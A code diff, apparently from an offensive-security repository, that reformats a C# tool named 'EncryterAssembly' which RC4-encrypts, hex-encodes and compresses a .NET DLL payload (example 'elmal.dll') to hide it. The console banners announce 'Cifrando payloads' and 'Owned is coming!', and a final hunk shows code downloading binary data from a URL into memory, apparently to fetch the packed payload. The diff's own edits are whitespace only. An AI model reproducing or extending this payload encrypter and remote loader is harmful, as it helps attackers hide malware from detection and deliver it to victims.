@@ -1,4 +1,4 @@
-﻿/*
+/*
  * Creado por SharpDevelop.
  * User: CyberVaca 
  * Twitter: https://twitter.com/CyberVaca_
@@ -16,13 +16,13 @@ using System.Net;
 using System.Reflection;
 namespace EncryterAssembly
 {
-class Program
-{
+    class Program
+    {
 
-static void Main(string[] args)
-{
+        static void Main(string[] args)
+        {
 
-string banner = @"
+            string banner = @"
  _____                            _            
 |  ___|                          | |           
 | |__ _ __   ___ _ __ _   _ _ __ | |_ ___ _ __ 
@@ -45,58 +45,59 @@ string banner = @"
 
 ";
 
-  if (args.Length <= 2)
+            if (args.Length <= 2)
             {
-  				Console.ForegroundColor = ConsoleColor.Green;
-  				Console.WriteLine(banner);
-  				Console.ForegroundColor = ConsoleColor.White;
-  				Console.WriteLine(@"[-] Insuficientes parametros :("); Console.WriteLine();
-  	            Console.WriteLine("[+] Ejemplo:");
-  	            Console.WriteLine("[+] EncrypterAssembly.exe elmal.dll passwordsecretisitma output.txt");
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine(banner);
+                Console.ForegroundColor = ConsoleColor.White;
+                Console.WriteLine(@"[-] Insuficientes parametros :("); Console.WriteLine();
+                Console.WriteLine("[+] Ejemplo:");
+                Console.WriteLine("[+] EncrypterAssembly.exe elmal.dll passwordsecretisitma output.txt");
                 System.Environment.Exit(1);
             }
-  
 
 
-  
-  
-string target_dll = args[0].ToString();
-if (System.IO.File.Exists(target_dll) == true) { } else { Console.WriteLine("\n[+] Error, no existe la dll :("); System.Environment.Exit(1); }
-string clave = args[1].ToString();
-string path = args[2].ToString();
-string claves = "";
-foreach (byte item in clave)
-{
-claves += " " + item.ToString();
-}
-byte[] futurakey = Encoding.ASCII.GetBytes(clave);
 
-Console.ForegroundColor = ConsoleColor.Green;
-Console.Write(banner);
-Console.WriteLine();
-Console.ForegroundColor = ConsoleColor.Green;
-Console.WriteLine("Cifrando payloads cabesha! ");
-Console.ForegroundColor = ConsoleColor.Green;
-Console.WriteLine("Owned is coming!\n");
-Console.ForegroundColor = ConsoleColor.Green;
-Console.WriteLine("[+] Usando encriptacion RC4");
-Console.ForegroundColor = ConsoleColor.Green;
-Console.WriteLine("[+] Key RC4:" + claves);
-//------------------------------------------------------//
-//					Leemos dll a encriptar				//
-//------------------------------------------------------//
-byte[] XPay = System.IO.File.ReadAllBytes(target_dll);
- //------------------------------------------------------//
-//			Encriptamos dll y pasamos a hexadecimal		//
-//------------------------------------------------------//
-byte[] movida_encriptada = RC4.Encrypt(futurakey,XPay);
-string hexadecimal = BiteArrayToHex.Convierte(movida_encriptada);
-string base64 = Zipea.Comprime(hexadecimal);
-System.IO.File.WriteAllText(path,base64);
-Console.WriteLine("[+] Archivo guardado en: " + path);
-Console.ForegroundColor = ConsoleColor.White;
+
+
+            string target_dll = args[0].ToString();
+            if (System.IO.File.Exists(target_dll) == true) { } else { Console.WriteLine("\n[+] Error, no existe la dll :("); System.Environment.Exit(1); }
+            string clave = args[1].ToString();
+            string path = args[2].ToString();
+            string claves = "";
+            foreach (byte item in clave)
+            {
+                claves += " " + item.ToString();
+            }
+            byte[] futurakey = Encoding.ASCII.GetBytes(clave);
+
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.Write(banner);
+            Console.WriteLine();
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("Cifrando payloads cabesha! ");
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("Owned is coming!\n");
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("[+] Usando encriptacion RC4");
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("[+] Key RC4:" + claves);
+            //------------------------------------------------------//
+            //					Leemos dll a encriptar				//
+            //------------------------------------------------------//
+            byte[] XPay = System.IO.File.ReadAllBytes(target_dll);
+            //------------------------------------------------------//
+            //			Encriptamos dll y pasamos a hexadecimal		//
+            //------------------------------------------------------//
+            byte[] movida_encriptada = RC4.Encrypt(futurakey, XPay);
+            string hexadecimal = BiteArrayToHex.Convierte(movida_encriptada);
+            string base64 = Zipea.Comprime(hexadecimal);
+            System.IO.File.WriteAllText(path, base64);
+            Console.WriteLine();
+            Console.WriteLine("[+] Archivo guardado en: " + path);
+            Console.ForegroundColor = ConsoleColor.White;
         }
-}
+    }
     public class BiteArrayToHex
     {
         public static string Convierte(byte[] bytearray_a_convertir)
@@ -286,7 +287,7 @@ Console.ForegroundColor = ConsoleColor.White;
             MemoryStream ms = new MemoryStream();
             using (WebClient client = new WebClient())
             {
-                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls; 
+                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls;
                 ms = new MemoryStream(client.DownloadData(http));
                 BinaryReader br = new BinaryReader(ms);
                 byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
